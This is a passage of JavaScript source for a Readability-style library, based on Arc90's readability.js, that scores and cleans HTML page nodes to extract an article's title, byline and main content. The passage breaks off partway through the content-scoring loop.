/*
 * Copyright (c) 2010 Arc90 Inc
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/*
 * This code is heavily based on Arc90's readability.js (1.7.1) script
 * available at: http://code.google.com/p/arc90labs-readability
 */

/**
 * Public constructor.
 * @param {HTMLDocument} doc     The DocumentNode to parse.
 * @param {Object}       options The options object.
 */
function Readability(doc, options) {
  // In some older versions, people passed a URI as the first argument. Cope:
  if (options && options.documentElement) {
    doc = options;
    options = arguments[2];
  } else if (!doc || !doc.documentElement) {
    throw new Error("First argument to Readability constructor should be a DocumentNode object.");
  }
  options = options || {};

  this._doc = doc;
  this._docJSDOMParser = this._doc.firstChild.__JSDOMParser__;
  this._articleTitle = null;
  this._articleByline = null;
  this._articleDir = null;
  this._articleSiteName = null;
  this._attempts = [];

  // Configurable options
  this._debug = !!options.debug;
  this._maxElemsToParse = options.maxElemsToParse || this.DEFAULT_MAX_ELEMS_TO_PARSE;
  this._nbTopCandidates = options.nbTopCandidates || this.DEFAULT_N_TOP_CANDIDATES;
  this._charThreshold = options.charThreshold || this.DEFAULT_CHAR_THRESHOLD;
  this._classesToPreserve = this.CLASSES_TO_PRESERVE.concat(options.classesToPreserve || []);
  this._keepClasses = !!options.keepClasses;
  this._serializer = options.serializer || function(el) {
    return el.innerHTML;
  };
  this._disableJSONLD = !!options.disableJSONLD;
  this._allowedVideoRegex = options.allowedVideoRegex || this.REGEXPS.videos;

  // Start with all flags set
  this._flags = this.FLAG_STRIP_UNLIKELYS |
                this.FLAG_WEIGHT_CLASSES |
                this.FLAG_CLEAN_CONDITIONALLY;


  // Control whether log messages are sent to the console
  if (this._debug) {
    let logNode = function(node) {
      if (node.nodeType == node.TEXT_NODE) {
        return `${node.nodeName} ("${node.textContent}")`;
      }
      let attrPairs = Array.from(node.attributes || [], function(attr) {
        return `${attr.name}="${attr.value}"`;
      }).join(" ");
      return `<${node.localName} ${attrPairs}>`;
    };
    this.log = function () {
      if (typeof console !== "undefined") {
        let args = Array.from(arguments, arg => {
          if (arg && arg.nodeType == this.ELEMENT_NODE) {
            return logNode(arg);
          }
          return arg;
        });
        args.unshift("Reader: (Readability)");
        console.log.apply(console, args);
      } else if (typeof dump !== "undefined") {
        /* global dump */
        var msg = Array.prototype.map.call(arguments, function(x) {
          return (x && x.nodeName) ? logNode(x) : x;
        }).join(" ");
        dump("Reader: (Readability) " + msg + "\n");
      }
    };
  } else {
    this.log = function () {};
  }
}

Readability.prototype = {
  FLAG_STRIP_UNLIKELYS: 0x1,
  FLAG_WEIGHT_CLASSES: 0x2,
  FLAG_CLEAN_CONDITIONALLY: 0x4,

  // https://developer.mozilla.org/en-US/docs/Web/API/Node/nodeType
  ELEMENT_NODE: 1,
  TEXT_NODE: 3,

  // Max number of nodes supported by this parser. Default: 0 (no limit)
  DEFAULT_MAX_ELEMS_TO_PARSE: 0,

  // The number of top candidates to consider when analysing how
  // tight the competition is among candidates.
  DEFAULT_N_TOP_CANDIDATES: 5,

  // Element tags to score by default.
  DEFAULT_TAGS_TO_SCORE: "section,h2,h3,h4,h5,h6,p,td,pre".toUpperCase().split(","),

  // The default number of chars an article must have in order to return a result
  DEFAULT_CHAR_THRESHOLD: 500,

  // All of the regular expressions in use within readability.
  // Defined up here so we don't instantiate them repeatedly in loops.
  REGEXPS: {
    // NOTE: These two regular expressions are duplicated in
    // Readability-readerable.js. Please keep both copies in sync.
    unlikelyCandidates: /-ad-|ai2html|banner|breadcrumbs|combx|comment|community|cover-wrap|disqus|extra|footer|gdpr|header|legends|menu|related|remark|replies|rss|shoutbox|sidebar|skyscraper|social|sponsor|supplemental|ad-break|agegate|pagination|pager|popup|yom-remote/i,
    okMaybeItsACandidate: /and|article|body|column|content|main|shadow/i,

    positive: /article|body|content|entry|hentry|h-entry|main|page|pagination|post|text|blog|story/i,
    negative: /-ad-|hidden|^hid$| hid$| hid |^hid |banner|combx|comment|com-|contact|foot|footer|footnote|gdpr|masthead|media|meta|outbrain|promo|related|scroll|share|shoutbox|sidebar|skyscraper|sponsor|shopping|tags|tool|widget/i,
    extraneous: /print|archive|comment|discuss|e[\-]?mail|share|reply|all|login|sign|single|utility/i,
    byline: /byline|author|dateline|writtenby|p-author/i,
    replaceFonts: /<(\/?)font[^>]*>/gi,
    normalize: /\s{2,}/g,
    videos: /\/\/(www\.)?((dailymotion|youtube|youtube-nocookie|player\.vimeo|v\.qq)\.com|(archive|upload\.wikimedia)\.org|player\.twitch\.tv)/i,
    shareElements: /(\b|_)(share|sharedaddy)(\b|_)/i,
    nextLink: /(next|weiter|continue|>([^\|]|$)|»([^\|]|$))/i,
    prevLink: /(prev|earl|old|new|<|«)/i,
    tokenize: /\W+/g,
    whitespace: /^\s*$/,
    hasContent: /\S$/,
    hashUrl: /^#.+/,
    srcsetUrl: /(\S+)(\s+[\d.]+[xw])?(\s*(?:,|$))/g,
    b64DataUrl: /^data:\s*([^\s;,]+)\s*;\s*base64\s*,/i,
    // See: https://schema.org/Article
    jsonLdArticleTypes: /^Article|AdvertiserContentArticle|NewsArticle|AnalysisNewsArticle|AskPublicNewsArticle|BackgroundNewsArticle|OpinionNewsArticle|ReportageNewsArticle|ReviewNewsArticle|Report|SatiricalArticle|ScholarlyArticle|MedicalScholarlyArticle|SocialMediaPosting|BlogPosting|LiveBlogPosting|DiscussionForumPosting|TechArticle|APIReference$/
  },

  UNLIKELY_ROLES: [ "menu", "menubar", "complementary", "navigation", "alert", "alertdialog", "dialog" ],

  DIV_TO_P_ELEMS: new Set([ "BLOCKQUOTE", "DL", "DIV", "IMG", "OL", "P", "PRE", "TABLE", "UL" ]),

  ALTER_TO_DIV_EXCEPTIONS: ["DIV", "ARTICLE", "SECTION", "P"],

  PRESENTATIONAL_ATTRIBUTES: [ "align", "background", "bgcolor", "border", "cellpadding", "cellspacing", "frame", "hspace", "rules", "style", "valign", "vspace" ],

  DEPRECATED_SIZE_ATTRIBUTE_ELEMS: [ "TABLE", "TH", "TD", "HR", "PRE" ],

  // The commented out elements qualify as phrasing content but tend to be
  // removed by readability when put into paragraphs, so we ignore them here.
  PHRASING_ELEMS: [
    // "CANVAS", "IFRAME", "SVG", "VIDEO",
    "ABBR", "AUDIO", "B", "BDO", "BR", "BUTTON", "CITE", "CODE", "DATA",
    "DATALIST", "DFN", "EM", "EMBED", "I", "IMG", "INPUT", "KBD", "LABEL",
    "MARK", "MATH", "METER", "NOSCRIPT", "OBJECT", "OUTPUT", "PROGRESS", "Q",
    "RUBY", "SAMP", "SCRIPT", "SELECT", "SMALL", "SPAN", "STRONG", "SUB",
    "SUP", "TEXTAREA", "TIME", "VAR", "WBR"
  ],

  // These are the classes that readability sets itself.
  CLASSES_TO_PRESERVE: [ "page" ],

  // These are the list of HTML entities that need to be escaped.
  HTML_ESCAPE_MAP: {
    "lt": "<",
    "gt": ">",
    "amp": "&",
    "quot": '"',
    "apos": "'",
  },

  /**
   * Run any post-process modifications to article content as necessary.
   *
   * @param Element
   * @return void
  **/
  _postProcessContent: function(articleContent) {
    // Readability cannot open relative uris so we convert them to absolute uris.
    this._fixRelativeUris(articleContent);

    this._simplifyNestedElements(articleContent);

    if (!this._keepClasses) {
      // Remove classes.
      this._cleanClasses(articleContent);
    }
  },

  /**
   * Iterates over a NodeList, calls `filterFn` for each node and removes node
   * if function returned `true`.
   *
   * If function is not passed, removes all the nodes in node list.
   *
   * @param NodeList nodeList The nodes to operate on
   * @param Function filterFn the function to use as a filter
   * @return void
   */
  _removeNodes: function(nodeList, filterFn) {
    // Avoid ever operating on live node lists.
    if (this._docJSDOMParser && nodeList._isLiveNodeList) {
      throw new Error("Do not pass live node lists to _removeNodes");
    }
    for (var i = nodeList.length - 1; i >= 0; i--) {
      var node = nodeList[i];
      var parentNode = node.parentNode;
      if (parentNode) {
        if (!filterFn || filterFn.call(this, node, i, nodeList)) {
          parentNode.removeChild(node);
        }
      }
    }
  },

  /**
   * Iterates over a NodeList, and calls _setNodeTag for each node.
   *
   * @param NodeList nodeList The nodes to operate on
   * @param String newTagName the new tag name to use
   * @return void
   */
  _replaceNodeTags: function(nodeList, newTagName) {
    // Avoid ever operating on live node lists.
    if (this._docJSDOMParser && nodeList._isLiveNodeList) {
      throw new Error("Do not pass live node lists to _replaceNodeTags");
    }
    for (const node of nodeList) {
      this._setNodeTag(node, newTagName);
    }
  },

  /**
   * Iterate over a NodeList, which doesn't natively fully implement the Array
   * interface.
   *
   * For convenience, the current object context is applied to the provided
   * iterate function.
   *
   * @param  NodeList nodeList The NodeList.
   * @param  Function fn       The iterate function.
   * @return void
   */
  _forEachNode: function(nodeList, fn) {
    Array.prototype.forEach.call(nodeList, fn, this);
  },

  /**
   * Iterate over a NodeList, and return the first node that passes
   * the supplied test function
   *
   * For convenience, the current object context is applied to the provided
   * test function.
   *
   * @param  NodeList nodeList The NodeList.
   * @param  Function fn       The test function.
   * @return void
   */
  _findNode: function(nodeList, fn) {
    return Array.prototype.find.call(nodeList, fn, this);
  },

  /**
   * Iterate over a NodeList, return true if any of the provided iterate
   * function calls returns true, false otherwise.
   *
   * For convenience, the current object context is applied to the
   * provided iterate function.
   *
   * @param  NodeList nodeList The NodeList.
   * @param  Function fn       The iterate function.
   * @return Boolean
   */
  _someNode: function(nodeList, fn) {
    return Array.prototype.some.call(nodeList, fn, this);
  },

  /**
   * Iterate over a NodeList, return true if all of the provided iterate
   * function calls return true, false otherwise.
   *
   * For convenience, the current object context is applied to the
   * provided iterate function.
   *
   * @param  NodeList nodeList The NodeList.
   * @param  Function fn       The iterate function.
   * @return Boolean
   */
  _everyNode: function(nodeList, fn) {
    return Array.prototype.every.call(nodeList, fn, this);
  },

  /**
   * Concat all nodelists passed as arguments.
   *
   * @return ...NodeList
   * @return Array
   */
  _concatNodeLists: function() {
    var slice = Array.prototype.slice;
    var args = slice.call(arguments);
    var nodeLists = args.map(function(list) {
      return slice.call(list);
    });
    return Array.prototype.concat.apply([], nodeLists);
  },

  _getAllNodesWithTag: function(node, tagNames) {
    if (node.querySelectorAll) {
      return node.querySelectorAll(tagNames.join(","));
    }
    return [].concat.apply([], tagNames.map(function(tag) {
      var collection = node.getElementsByTagName(tag);
      return Array.isArray(collection) ? collection : Array.from(collection);
    }));
  },

  /**
   * Removes the class="" attribute from every element in the given
   * subtree, except those that match CLASSES_TO_PRESERVE and
   * the classesToPreserve array from the options object.
   *
   * @param Element
   * @return void
   */
  _cleanClasses: function(node) {
    var classesToPreserve = this._classesToPreserve;
    var className = (node.getAttribute("class") || "")
      .split(/\s+/)
      .filter(function(cls) {
        return classesToPreserve.indexOf(cls) != -1;
      })
      .join(" ");

    if (className) {
      node.setAttribute("class", className);
    } else {
      node.removeAttribute("class");
    }

    for (node = node.firstElementChild; node; node = node.nextElementSibling) {
      this._cleanClasses(node);
    }
  },

  /**
   * Converts each <a> and <img> uri in the given element to an absolute URI,
   * ignoring #ref URIs.
   *
   * @param Element
   * @return void
   */
  _fixRelativeUris: function(articleContent) {
    var baseURI = this._doc.baseURI;
    var documentURI = this._doc.documentURI;
    function toAbsoluteURI(uri) {
      // Leave hash links alone if the base URI matches the DocumentNode URI:
      if (baseURI == documentURI && uri.charAt(0) == "#") {
        return uri;
      }

      // Otherwise, resolve against base URI:
      try {
        return new URL(uri, baseURI).href;
      } catch (ex) {
        // Something went wrong, just return the original:
      }
      return uri;
    }

    var links = this._getAllNodesWithTag(articleContent, ["a"]);
    this._forEachNode(links, function(link) {
      var href = link.getAttribute("href");
      if (href) {
        // Remove links with javascript: URIs, since
        // they won't work after scripts have been removed from the page.
        if (href.indexOf("javascript:") === 0) {
          // if the link only contains simple text content, it can be converted to a text node
          if (link.childNodes.length === 1 && link.childNodes[0].nodeType === this.TEXT_NODE) {
            var text = this._doc.createTextNode(link.textContent);
            link.parentNode.replaceChild(text, link);
          } else {
            // if the link has multiple children, they should all be preserved
            var container = this._doc.createElement("span");
            while (link.firstChild) {
              container.appendChild(link.firstChild);
            }
            link.parentNode.replaceChild(container, link);
          }
        } else {
          link.setAttribute("href", toAbsoluteURI(href));
        }
      }
    });

    var medias = this._getAllNodesWithTag(articleContent, [
      "img", "picture", "figure", "video", "audio", "source"
    ]);

    this._forEachNode(medias, function(media) {
      var src = media.getAttribute("src");
      var poster = media.getAttribute("poster");
      var srcset = media.getAttribute("srcset");

      if (src) {
        media.setAttribute("src", toAbsoluteURI(src));
      }

      if (poster) {
        media.setAttribute("poster", toAbsoluteURI(poster));
      }

      if (srcset) {
        var newSrcset = srcset.replace(this.REGEXPS.srcsetUrl, function(_, p1, p2, p3) {
          return toAbsoluteURI(p1) + (p2 || "") + p3;
        });

        media.setAttribute("srcset", newSrcset);
      }
    });
  },

  _simplifyNestedElements: function(articleContent) {
    var node = articleContent;

    while (node) {
      if (node.parentNode && ["DIV", "SECTION"].includes(node.tagName) && !(node.id && node.id.startsWith("readability"))) {
        if (this._isElementWithoutContent(node)) {
          node = this._removeAndGetNext(node);
          continue;
        } else if (this._hasSingleTagInsideElement(node, "DIV") || this._hasSingleTagInsideElement(node, "SECTION")) {
          var child = node.children[0];
          for (var i = 0; i < node.attributes.length; i++) {
            child.setAttribute(node.attributes[i].name, node.attributes[i].value);
          }
          node.parentNode.replaceChild(child, node);
          node = child;
          continue;
        }
      }

      node = this._getNextNode(node);
    }
  },

  /**
   * Get the article title as an H1.
   *
   * @return string
   **/
  _getArticleTitle: function() {
    var doc = this._doc;
    var curTitle = "";
    var origTitle = "";

    try {
      curTitle = origTitle = doc.title.trim();

      // If they had an element with id "title" in their HTML
      if (typeof curTitle !== "string")
        curTitle = origTitle = this._getInnerText(doc.getElementsByTagName("title")[0]);
    } catch (e) {/* ignore exceptions setting the title. */}

    var titleHadHierarchicalSeparators = false;
    function wordCount(str) {
      return str.split(/\s+/).length;
    }

    // If there's a separator in the title, first remove the final part
    if ((/ [\|\-\\\/>»] /).test(curTitle)) {
      titleHadHierarchicalSeparators = / [\\\/>»] /.test(curTitle);
      curTitle = origTitle.replace(/(.*)[\|\-\\\/>»] .*/gi, "$1");

      // If the resulting title is too short (3 words or fewer), remove
      // the first part instead:
      if (wordCount(curTitle) < 3)
        curTitle = origTitle.replace(/[^\|\-\\\/>»]*[\|\-\\\/>»](.*)/gi, "$1");
    } else if (curTitle.indexOf(": ") !== -1) {
      // Check if we have an heading containing this exact string, so we
      // could assume it's the full title.
      var headings = this._concatNodeLists(
        doc.getElementsByTagName("h1"),
        doc.getElementsByTagName("h2")
      );
      var trimmedTitle = curTitle.trim();
      var match = this._someNode(headings, function(heading) {
        return heading.textContent.trim() === trimmedTitle;
      });

      // If we don't, let's extract the title out of the original title string.
      if (!match) {
        curTitle = origTitle.substring(origTitle.lastIndexOf(":") + 1);

        // If the title is now too short, try the first colon instead:
        if (wordCount(curTitle) < 3) {
          curTitle = origTitle.substring(origTitle.indexOf(":") + 1);
          // But if we have too many words before the colon there's something weird
          // with the titles and the H tags so let's just use the original title instead
        } else if (wordCount(origTitle.substr(0, origTitle.indexOf(":"))) > 5) {
          curTitle = origTitle;
        }
      }
    } else if (curTitle.length > 150 || curTitle.length < 15) {
      var hOnes = doc.getElementsByTagName("h1");

      if (hOnes.length === 1)
        curTitle = this._getInnerText(hOnes[0]);
    }

    curTitle = curTitle.trim().replace(this.REGEXPS.normalize, " ");
    // If we now have 4 words or fewer as our title, and either no
    // 'hierarchical' separators (\, /, > or ») were found in the original
    // title or we decreased the number of words by more than 1 word, use
    // the original title.
    var curTitleWordCount = wordCount(curTitle);
    if (curTitleWordCount <= 4 &&
        (!titleHadHierarchicalSeparators ||
         curTitleWordCount != wordCount(origTitle.replace(/[\|\-\\\/>»]+/g, "")) - 1)) {
      curTitle = origTitle;
    }

    return curTitle;
  },

  /**
   * Prepare the HTML DocumentNode for readability to scrape it.
   * This includes things like stripping javascript, CSS, and handling terrible markup.
   *
   * @return void
   **/
  _prepDocument: function() {
    var doc = this._doc;

    // Remove all style tags in head
    this._removeNodes(this._getAllNodesWithTag(doc, ["style"]));

    if (doc.body) {
      this._replaceBrs(doc.body);
    }

    this._replaceNodeTags(this._getAllNodesWithTag(doc, ["font"]), "SPAN");
  },

  /**
   * Finds the next node, starting from the given node, and ignoring
   * whitespace in between. If the given node is an element, the same node is
   * returned.
   */
  _nextNode: function (node) {
    var next = node;
    while (next
        && (next.nodeType != this.ELEMENT_NODE)
        && this.REGEXPS.whitespace.test(next.textContent)) {
      next = next.nextSibling;
    }
    return next;
  },

  /**
   * Replaces 2 or more successive <br> elements with a single <p>.
   * Whitespace between <br> elements are ignored. For example:
   *   <div>foo<br>bar<br> <br><br>abc</div>
   * will become:
   *   <div>foo<br>bar<p>abc</p></div>
   */
  _replaceBrs: function (elem) {
    this._forEachNode(this._getAllNodesWithTag(elem, ["br"]), function(br) {
      var next = br.nextSibling;

      // Whether 2 or more <br> elements have been found and replaced with a
      // <p> block.
      var replaced = false;

      // If we find a <br> chain, remove the <br>s until we hit another node
      // or non-whitespace. This leaves behind the first <br> in the chain
      // (which will be replaced with a <p> later).
      while ((next = this._nextNode(next)) && (next.tagName == "BR")) {
        replaced = true;
        var brSibling = next.nextSibling;
        next.parentNode.removeChild(next);
        next = brSibling;
      }

      // If we removed a <br> chain, replace the remaining <br> with a <p>. Add
      // all sibling nodes as children of the <p> until we hit another <br>
      // chain.
      if (replaced) {
        var p = this._doc.createElement("p");
        br.parentNode.replaceChild(p, br);

        next = p.nextSibling;
        while (next) {
          // If we've hit another <br><br>, we're done adding children to this <p>.
          if (next.tagName == "BR") {
            var nextElem = this._nextNode(next.nextSibling);
            if (nextElem && nextElem.tagName == "BR")
              break;
          }

          if (!this._isPhrasingContent(next))
            break;

          // Otherwise, make this node a child of the new <p>.
          var sibling = next.nextSibling;
          p.appendChild(next);
          next = sibling;
        }

        while (p.lastChild && this._isWhitespace(p.lastChild)) {
          p.removeChild(p.lastChild);
        }

        if (p.parentNode.tagName === "P")
          this._setNodeTag(p.parentNode, "DIV");
      }
    });
  },

  _setNodeTag: function (node, tag) {
    this.log("_setNodeTag", node, tag);
    if (this._docJSDOMParser) {
      node.localName = tag.toLowerCase();
      node.tagName = tag.toUpperCase();
      return node;
    }

    var replacement = node.ownerDocument.createElement(tag);
    while (node.firstChild) {
      replacement.appendChild(node.firstChild);
    }
    node.parentNode.replaceChild(replacement, node);
    if (node.readability)
      replacement.readability = node.readability;

    for (var i = 0; i < node.attributes.length; i++) {
      try {
        replacement.setAttribute(node.attributes[i].name, node.attributes[i].value);
      } catch (ex) {
        /* it's possible for setAttribute() to throw if the attribute name
         * isn't a valid XML Name. Such attributes can however be parsed from
         * source in HTML docs, see https://github.com/whatwg/html/issues/4275,
         * so we can hit them here and then throw. We don't care about such
         * attributes so we ignore them.
         */
      }
    }
    return replacement;
  },

  /**
   * Prepare the article node for display. Clean out any inline styles,
   * iframes, forms, strip extraneous <p> tags, etc.
   *
   * @param Element
   * @return void
   **/
  _prepArticle: function(articleContent) {
    this._cleanStyles(articleContent);

    // Check for data tables before we continue, to avoid removing items in
    // those tables, which will often be isolated even though they're
    // visually linked to other content-ful elements (text, images, etc.).
    this._markDataTables(articleContent);

    this._fixLazyImages(articleContent);

    // Clean out junk from the article content
    this._cleanConditionally(articleContent, "form");
    this._cleanConditionally(articleContent, "fieldset");
    this._clean(articleContent, "object");
    this._clean(articleContent, "embed");
    this._clean(articleContent, "footer");
    this._clean(articleContent, "link");
    this._clean(articleContent, "aside");

    // Clean out elements with little content that have "share" in their id/class combinations from final top candidates,
    // which means we don't remove the top candidates even they have "share".

    var shareElementThreshold = this.DEFAULT_CHAR_THRESHOLD;

    this._forEachNode(articleContent.children, function (topCandidate) {
      this._cleanMatchedNodes(topCandidate, function (node, matchString) {
        return this.REGEXPS.shareElements.test(matchString) && node.textContent.length < shareElementThreshold;
      });
    });

    this._clean(articleContent, "iframe");
    this._clean(articleContent, "input");
    this._clean(articleContent, "textarea");
    this._clean(articleContent, "select");
    this._clean(articleContent, "button");
    this._cleanHeaders(articleContent);

    // Do these last as the previous stuff may have removed junk
    // that will affect these
    this._cleanConditionally(articleContent, "table");
    this._cleanConditionally(articleContent, "ul");
    this._cleanConditionally(articleContent, "div");

    // replace H1 with H2 as H1 should be only title that is displayed separately
    this._replaceNodeTags(this._getAllNodesWithTag(articleContent, ["h1"]), "h2");

    // Remove extra paragraphs
    this._removeNodes(this._getAllNodesWithTag(articleContent, ["p"]), function (paragraph) {
      var imgCount = paragraph.getElementsByTagName("img").length;
      var embedCount = paragraph.getElementsByTagName("embed").length;
      var objectCount = paragraph.getElementsByTagName("object").length;
      // At this point, nasty iframes have been removed, only remain embedded video ones.
      var iframeCount = paragraph.getElementsByTagName("iframe").length;
      var totalCount = imgCount + embedCount + objectCount + iframeCount;

      return totalCount === 0 && !this._getInnerText(paragraph, false);
    });

    this._forEachNode(this._getAllNodesWithTag(articleContent, ["br"]), function(br) {
      var next = this._nextNode(br.nextSibling);
      if (next && next.tagName == "P")
        br.parentNode.removeChild(br);
    });

    // Remove single-cell tables
    this._forEachNode(this._getAllNodesWithTag(articleContent, ["table"]), function(table) {
      var tbody = this._hasSingleTagInsideElement(table, "TBODY") ? table.firstElementChild : table;
      if (this._hasSingleTagInsideElement(tbody, "TR")) {
        var row = tbody.firstElementChild;
        if (this._hasSingleTagInsideElement(row, "TD")) {
          var cell = row.firstElementChild;
          cell = this._setNodeTag(cell, this._everyNode(cell.childNodes, this._isPhrasingContent) ? "P" : "DIV");
          table.parentNode.replaceChild(cell, table);
        }
      }
    });
  },

  /**
   * Initialize a node with the readability object. Also checks the
   * className/id for special names to add to its score.
   *
   * @param Element
   * @return void
  **/
  _initializeNode: function(node) {
    node.readability = {"contentScore": 0};

    switch (node.tagName) {
      case "DIV":
        node.readability.contentScore += 5;
        break;

      case "PRE":
      case "TD":
      case "BLOCKQUOTE":
        node.readability.contentScore += 3;
        break;

      case "ADDRESS":
      case "OL":
      case "UL":
      case "DL":
      case "DD":
      case "DT":
      case "LI":
      case "FORM":
        node.readability.contentScore -= 3;
        break;

      case "H1":
      case "H2":
      case "H3":
      case "H4":
      case "H5":
      case "H6":
      case "TH":
        node.readability.contentScore -= 5;
        break;
    }

    node.readability.contentScore += this._getClassWeight(node);
  },

  _removeAndGetNext: function(node) {
    var nextNode = this._getNextNode(node, true);
    node.parentNode.removeChild(node);
    return nextNode;
  },

  /**
   * Traverse the DOM from node to node, starting at the node passed in.
   * Pass true for the second parameter to indicate this node itself
   * (and its kids) are going away, and we want the next node over.
   *
   * Calling this in a loop will traverse the DOM depth-first.
   */
  _getNextNode: function(node, ignoreSelfAndKids) {
    // First check for kids if those aren't being ignored
    if (!ignoreSelfAndKids && node.firstElementChild) {
      return node.firstElementChild;
    }
    // Then for siblings...
    if (node.nextElementSibling) {
      return node.nextElementSibling;
    }
    // And finally, move up the parent chain *and* find a sibling
    // (because this is depth-first traversal, we will have already
    // seen the parent nodes themselves).
    do {
      node = node.parentNode;
    } while (node && !node.nextElementSibling);
    return node && node.nextElementSibling;
  },

  // compares second text to first one
  // 1 = same text, 0 = completely different text
  // works the way that it splits both texts into words and then finds words that are unique in second text
  // the result is given by the lower length of unique parts
  _textSimilarity: function(textA, textB) {
    var tokensA = textA.toLowerCase().split(this.REGEXPS.tokenize).filter(Boolean);
    var tokensB = textB.toLowerCase().split(this.REGEXPS.tokenize).filter(Boolean);
    if (!tokensA.length || !tokensB.length) {
      return 0;
    }
    var uniqTokensB = tokensB.filter(token => !tokensA.includes(token));
    var distanceB = uniqTokensB.join(" ").length / tokensB.join(" ").length;
    return 1 - distanceB;
  },

  _checkByline: function(node, matchString) {
    if (this._articleByline) {
      return false;
    }

    if (node.getAttribute !== undefined) {
      var rel = node.getAttribute("rel");
      var itemprop = node.getAttribute("itemprop");
    }

    if ((rel === "author" || (itemprop && itemprop.indexOf("author") !== -1) || this.REGEXPS.byline.test(matchString)) && this._isValidByline(node.textContent)) {
      this._articleByline = node.textContent.trim();
      return true;
    }

    return false;
  },

  _getNodeAncestors: function(node, maxDepth) {
    maxDepth = maxDepth || 0;
    var i = 0, ancestors = [];
    while (node.parentNode) {
      ancestors.push(node.parentNode);
      if (maxDepth && ++i === maxDepth)
        break;
      node = node.parentNode;
    }
    return ancestors;
  },

  /***
   * grabArticle - Using a variety of metrics (content score, classname, element types), find the content that is
   *         most likely to be the stuff a user wants to read. Then return it wrapped up in a div.
   *
   * @param page a DocumentNode to run upon. Needs to be a full DocumentNode, complete with body.
   * @return Element
  **/
  _grabArticle: function (page) {
    this.log("**** grabArticle ****");
    var doc = this._doc;
    var isPaging = page !== null;
    page = page ? page : this._doc.body;

    // We can't grab an article if we don't have a page!
    if (!page) {
      this.log("No body found in DocumentNode. Abort.");
      return null;
    }

    var pageCacheHtml = page.innerHTML;

    while (true) {
      this.log("Starting grabArticle loop");
      var stripUnlikelyCandidates = this._flagIsActive(this.FLAG_STRIP_UNLIKELYS);

      // First, node prepping. Trash nodes that look cruddy (like ones with the
      // class name "comment", etc), and turn divs into P tags where they have been
      // used inappropriately (as in, where they contain no other block level elements.)
      var elementsToScore = [];
      var node = this._doc.documentElement;

      let shouldRemoveTitleHeader = true;

      while (node) {

        if (node.tagName === "HTML") {
          this._articleLang = node.getAttribute("lang");
        }

        var matchString = node.className + " " + node.id;

        if (!this._isProbablyVisible(node)) {
          this.log("Removing hidden node - " + matchString);
          node = this._removeAndGetNext(node);
          continue;
        }

        // User is not able to see elements applied with both "aria-modal = true" and "role = dialog"
        if (node.getAttribute("aria-modal") == "true" && node.getAttribute("role") == "dialog") {
          node = this._removeAndGetNext(node);
          continue;
        }

        // Check to see if this node is a byline, and remove it if it is.
        if (this._checkByline(node, matchString)) {
          node = this._removeAndGetNext(node);
          continue;
        }

        if (shouldRemoveTitleHeader && this._headerDuplicatesTitle(node)) {
          this.log("Removing header: ", node.textContent.trim(), this._articleTitle.trim());
          shouldRemoveTitleHeader = false;
          node = this._removeAndGetNext(node);
          continue;
        }

        // Remove unlikely candidates
        if (stripUnlikelyCandidates) {
          if (this.REGEXPS.unlikelyCandidates.test(matchString) &&
              !this.REGEXPS.okMaybeItsACandidate.test(matchString) &&
              !this._hasAncestorTag(node, "table") &&
              !this._hasAncestorTag(node, "code") &&
              node.tagName !== "BODY" &&
              node.tagName !== "A") {
            this.log("Removing unlikely candidate - " + matchString);
            node = this._removeAndGetNext(node);
            continue;
          }

          if (this.UNLIKELY_ROLES.includes(node.getAttribute("role"))) {
            this.log("Removing content with role " + node.getAttribute("role") + " - " + matchString);
            node = this._removeAndGetNext(node);
            continue;
          }
        }

        // Remove DIV, SECTION, and HEADER nodes without any content(e.g. text, image, video, or iframe).
        if ((node.tagName === "DIV" || node.tagName === "SECTION" || node.tagName === "HEADER" ||
             node.tagName === "H1" || node.tagName === "H2" || node.tagName === "H3" ||
             node.tagName === "H4" || node.tagName === "H5" || node.tagName === "H6") &&
            this._isElementWithoutContent(node)) {
          node = this._removeAndGetNext(node);
          continue;
        }

        if (this.DEFAULT_TAGS_TO_SCORE.indexOf(node.tagName) !== -1) {
          elementsToScore.push(node);
        }

        // Turn all divs that don't have children block level elements into p's
        if (node.tagName === "DIV") {
          // Put phrasing content into paragraphs.
          var p = null;
          var childNode = node.firstChild;
          while (childNode) {
            var nextSibling = childNode.nextSibling;
            if (this._isPhrasingContent(childNode)) {
              if (p !== null) {
                p.appendChild(childNode);
              } else if (!this._isWhitespace(childNode)) {
                p = doc.createElement("p");
                node.replaceChild(p, childNode);
                p.appendChild(childNode);
              }
            } else if (p !== null) {
              while (p.lastChild && this._isWhitespace(p.lastChild)) {
                p.removeChild(p.lastChild);
              }
              p = null;
            }
            childNode = nextSibling;
          }

          // Sites like http://mobile.slate.com encloses each paragraph with a DIV
          // element. DIVs with only a P element inside and no text content can be
          // safely converted into plain P elements to avoid confusing the scoring
          // algorithm with DIVs with are, in practice, paragraphs.
          if (this._hasSingleTagInsideElement(node, "P") && this._getLinkDensity(node) < 0.25) {
            var newNode = node.children[0];
            node.parentNode.replaceChild(newNode, node);
            node = newNode;
            elementsToScore.push(node);
          } else if (!this._hasChildBlockElement(node)) {
            node = this._setNodeTag(node, "P");
            elementsToScore.push(node);
          }
        }
        node = this._getNextNode(node);
      }

      /**
       * Loop through all paragraphs, and assign a score to them based on how content-y they look.
       * Then add their score to their parent node.
       *
       * A score is determined by things like number of commas, class names, etc. Maybe eventually link density.
      **/
      var candidates = [];
      this._forEachNode(elementsToScore, function(elementToScore) {
        if (!elementToScore.parentNode || typeof(elementToScore.parentNode.tagName) === "undefined")
          return;

        // If this paragraph is less than 25 characters, don't even count it.
        var innerText = this._getInnerText(elementToScore);
        if (innerText.length < 25)
          return;

        // Exclude nodes with no ancestor.
        var ancestors = this._getNodeAncestors(elementToScore, 5);
        if (ancestors.length === 0)
          return;

        var contentScore = 0;

        // Add a point for the paragraph itself as a base.
        contentScore += 1;

        // Add points for any commas within this paragraph.
        contentScore += innerText.split(",").length;

        // For every 100 characters in this paragraph, add another point. Up to 3 points.
        contentScore += Math.min(Math.floor(innerText.length / 100), 3);

        // Initialize and score ancestors.
        this._forEachNode(ancestors, function(ancestor, level) {
          if (!ancestor.tagName || !ancestor.parentNode || typeof(ancestor.parentNode.tagName) === "undefined")
            return;

          if (typeof(ancestor.readability) === "undefined") {
            this._initializeNode(ancestor);
            candidates.push(ancestor);
